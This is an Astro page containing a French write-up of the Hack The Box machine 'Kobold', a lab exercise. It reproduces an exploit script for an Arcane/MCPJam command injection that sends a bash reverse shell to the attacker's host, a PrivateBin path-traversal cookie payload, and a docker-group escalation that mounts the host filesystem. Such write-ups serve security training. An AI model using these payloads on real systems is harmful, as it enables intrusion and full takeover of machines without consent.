@@ -1,0 +1,211 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+
+<Layout title="HTB - Kobold">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Kobold</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-easy">Easy</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">28 Mar 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2026-23520</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-64714 / GHSA-g2j9-g8r5-rg82</span>
+    </div>
+  </div>
+
+  <!-- RESUME -->
+  <div style="background:var(--bg-800); border-left:3px solid #27ae60; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">
+      Box Easy Linux centrée sur deux CVEs récentes dans l'écosystème Docker/MCP, exploitées avec un script public, puis enchaînées avec un abus du groupe docker pour atteindre root.
+    </p>
+  </div>
+
+  <!-- CHAINE D'ATTAQUE -->
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em;">Chaîne d'exploitation</div>
+
+      <div style="display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800); border-bottom:1px solid #0d0d15;">
+        <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">1</div>
+        <div>
+          <div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">Nmap + ffuf subdomains</div>
+          <div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ mcp.kobold.htb (Arcane v1.13.0) + bin.kobold.htb (PrivateBin 2.0.2)</div>
+        </div>
+      </div>
+
+      <div style="display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800); border-bottom:1px solid #0d0d15;">
+        <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">2</div>
+        <div>
+          <div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">CVE-2026-23520 — OS Command Injection Arcane</div>
+          <div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ RCE → shell ben</div>
+        </div>
+      </div>
+
+      <div style="display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800); border-bottom:1px solid #0d0d15;">
+        <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">3</div>
+        <div>
+          <div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">GHSA-g2j9-g8r5-rg82 — PrivateBin LFI</div>
+          <div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ Image Docker révélée via /srv/cfg/conf.php</div>
+        </div>
+      </div>
+
+      <div style="display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);">
+        <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">4</div>
+        <div>
+          <div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">Groupe operator → newgrp docker → montage filesystem host</div>
+          <div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ Root flag</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- CONTENU -->
+  <div class="prose">
+
+    <h2>1 — Reconnaissance</h2>
+
+    <p>Scan Nmap révélant 5 ports dont Arcane Docker Management sur 3552 et PrivateBin sur 8080.</p>
+
+    <pre is:raw>nmap -sV -sC -T4 &lt;IP_MACHINE&gt;
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http     nginx 1.18.0 → kobold.htb
+443/tcp  open  https    nginx 1.18.0
+3552/tcp open  Arcane   Docker Management v1.13.0
+8080/tcp open  http     PrivateBin</pre>
+
+    <p>Ajout des entrées /etc/hosts et fuzzing des sous-domaines :</p>
+
+    <pre is:raw>echo "&lt;IP&gt; kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
+
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -fs &lt;taille&gt;
+
+# mcp.kobold.htb  →  MCPJam Inspector + Arcane v1.13.0
+# bin.kobold.htb  →  PrivateBin 2.0.2</pre>
+
+    <h2>2 — CVE-2026-23520 : RCE Arcane MCPJam Inspector</h2>
+
+    <p>Arcane Docker Management v1.13.0 souffre d'une injection de commandes OS critique (GHSA-gjqq-6r35-w3r8, CVSS 9.1). L'endpoint /api/mcp/connect accepte des commandes arbitraires dans serverConfig.command sans sanitisation, accessible sans authentification.</p>
+
+    <p>Le PoC public (0xzap/CVE-2026-23520) envoie un POST JSON avec la commande bash en reverse shell :</p>
+
+    <pre is:raw>git clone https://github.com/0xzap/CVE-2026-23520
+cd CVE-2026-23520 && pip3 install requests
+
+# Mécanisme du script exploit.py :
+import requests, sys
+rhost, rport, lhost, lport = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
+url = f"https://{'{'}rhost{'}'} :{'{'}rport{'}'}/api/mcp/connect"
+payload = f"bash -c 'bash -i &gt;&amp; /dev/tcp/{'{'}lhost{'}'}/{'{'}lport{'}'} 0&gt;&amp;1'"
+data = {'{'}
+    "serverConfig": {'{'}
+        "command": "bash",
+        "args": ["-c", payload],
+        "env": {'{'}{'}'} 
+    {'}'},
+    "serverId": "exploit"
+{'}'}
+requests.post(url, json=data, verify=False, timeout=5)</pre>
+
+    <pre is:raw># Étape 1 — Listener Netcat
+nc -lvnp 4444
+
+# Étape 2 — Lancer l'exploit
+python3 exploit.py mcp.kobold.htb 443 &lt;TON_IP&gt; 4444
+
+# [*] Target: https://mcp.kobold.htb:443/api/mcp/connect
+# [*] Sending payload...
+# [+] Payload sent! Check your listener
+
+# Shell reçu :
+# ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$</pre>
+
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">
+      ⚠️ BLOCAGE : Utiliser HTTPS (port 443), pas HTTP — HTTP échouait silencieusement sans erreur visible.
+    </div>
+
+    <pre is:raw># Stabilisation du shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z puis : stty raw -echo; fg
+
+id
+# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+cat /home/ben/user.txt</pre>
+
+    <h2>3 — GHSA-g2j9-g8r5-rg82 : LFI PrivateBin</h2>
+
+    <p>PrivateBin versions 1.7.7 à 2.0.2 présentent une Local File Inclusion non authentifiée via le cookie 'template'. Le serveur inclut directement le fichier PHP référencé sans validation, permettant de lire des fichiers arbitraires.</p>
+
+    <p>Dans Kobold, cette vulnérabilité permet de lire /srv/cfg/conf.php et de découvrir l'image Docker utilisée — clé de l'escalade finale.</p>
+
+    <pre is:raw># LFI via cookie template — lecture de /srv/cfg/conf.php
+curl -b "template=../../../../srv/cfg/conf.php" \
+     http://bin.kobold.htb:8080/
+
+# Résultat : image Docker révélée → privatebin/nginx-fpm-alpine:2.0.2</pre>
+
+    <h2>4 — Privilege Escalation : Docker Group Abuse</h2>
+
+    <p>Le groupe operator donne accès à la commande newgrp docker, qui est l'équivalent de root sur l'hôte.</p>
+
+    <pre is:raw>newgrp docker
+id   # → gid=111(docker)
+
+docker images
+# REPOSITORY                      TAG     IMAGE ID
+# mysql                           latest  f66b7a288113
+# privatebin/nginx-fpm-alpine     2.0.2   f5f5564e6731</pre>
+
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">
+      ⚠️ BLOCAGE : L'image PrivateBin (nginx-fpm-alpine) démarre PHP-FPM et ignore les arguments — impossible de lui passer --entrypoint. Utiliser l'image mysql ou alpine à la place.
+    </div>
+
+    <pre is:raw># Montage du filesystem host avec l'image mysql
+# (l'image PrivateBin ignore les arguments, mysql accepte --entrypoint)
+docker run -v /:/hostfs --rm --entrypoint sh --user root mysql \
+  -c "cat /hostfs/root/root.txt"</pre>
+
+  </div>
+
+  <!-- LECONS -->
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>Toujours chercher des exploits publics sur GitHub avant de coder manuellement</div>
+      <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>Énumérer les subdomains même sur une box Easy — deux sous-domaines distincts ici</div>
+      <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>Vérifier id/groups dès l'obtention d'un shell — groupe operator était la clé</div>
+      <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>Groupe docker = root sur l'hôte — misconfiguration critique très courante en production</div>
+      <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>Certaines images Docker (FPM) ignorent les arguments — utiliser mysql ou alpine</div>
+    </div>
+  </div>
+
+  <!-- OUTILS -->
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ffuf','exploit.py (0xzap/CVE-2026-23520)','netcat','docker'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
